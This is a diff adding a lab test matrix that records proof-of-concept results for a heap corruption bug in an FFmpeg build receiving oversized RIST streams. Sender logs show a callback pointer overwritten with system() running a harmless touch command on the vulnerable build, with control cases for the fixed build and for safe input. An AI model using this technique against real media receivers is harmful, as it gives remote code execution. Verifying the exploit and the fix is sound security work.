@@ -1,0 +1,43 @@
+W4 no-debugger command-execution matrix — 2026-11-23 09:30-09:32Z.
+All cases: plain FFmpeg n9.0 build, librist 0.2.20 sender, 127.0.0.1:5004,
+MALLOC_MMAP_THRESHOLD_=16777216, ASLR disabled with `setarch -R`,
+no gdb attached. Receiver started first, sender 3 s later, 2200 blocks.
+
+Binary hashes (sha256):
+  plain/src/ffprobe_g       9273e3ac9ccf23ff3416e30ac9709321858b2cd552c73ec3fe13006b561e8934
+  plain/src/ffprobe_g-fixed 8d302dee66c9593805354938f56ffa9b4e0665279e6b8804fb13e3fab80e5857
+Sender sources:
+  rist_sender_cmd.c         deca9946e14a8245964b45ff022b914d9794413935d87744ef1c8e928ee6b8ee
+  rist_sender_live.c        a87e97b47b3aee36d09709483b1619733fe5365c554fbe2be777d49b70a02371
+
+Case ng-v4 (vulnerable, callback=system 0x7ffff7a58750,
+opaque=0x5555560d20d0, command `touch /tmp/ffmpeg2shell-w4-g4`):
+  evidence/ng-v4-send.log:
+    sent 2200 blocks of 9968 bytes prot=0x55555584f5a0 cb=0x7ffff7a58750
+    opaque=0x5555560d20d0 cmd='touch /tmp/ffmpeg2shell-w4-g4', 0 failures
+    sender rc=0
+  evidence/ng-v4-recv.log: double free or corruption (out); ffprobe rc=134
+  Observed side effect: /tmp/ffmpeg2shell-w4-g4 exists, size 0,
+  mtime 2026-11-23 09:30:58.267754190 +0000.
+
+Case ng-f4 (FFMIN-fixed binary, same wire bytes and callback):
+  evidence/ng-f4-send.log: same 2200 x 9968 sender line, 0 failures, sender rc=0
+  evidence/ng-f4-recv.log: ffprobe rc=124 (survived 25 s timeout)
+  Marker /tmp/ffmpeg2shell-w4-gf4 absent.
+
+Case ng-s4 (vulnerable binary, safe input 2200 x 512, uniform sender):
+  evidence/ng-s4-send.log: sent 2200 blocks of 512 bytes, 0 failures, sender rc=0
+  evidence/ng-s4-recv.log: ffprobe rc=124
+  Marker /tmp/ffmpeg2shell-w4-gs4 absent.
+
+Case ng-n4 (vulnerable binary, wire callback 0x0, same 9968 cmd payload):
+  evidence/ng-n4-send.log: sent 2200 blocks of 9968 bytes prot=0x...f5a0
+    cb=0x0 opaque=0x...20d0 cmd='touch /tmp/ffmpeg2shell-w4-gn4', 0 failures
+  evidence/ng-n4-recv.log: double free or corruption (out); ffprobe rc=134
+  Marker /tmp/ffmpeg2shell-w4-gn4 absent.
+
+Interpretation: only the vulnerable build with a nonzero chosen callback and
+an oversized RIST stream executes the lab-chosen loopback command. The fixed
+build, the 512-byte safe stream and the null-callback wire value all lack the
+side effect. Full packet captures stay in the local lab tree; replay with
+live/no-gdb-case.sh and the hashes above.
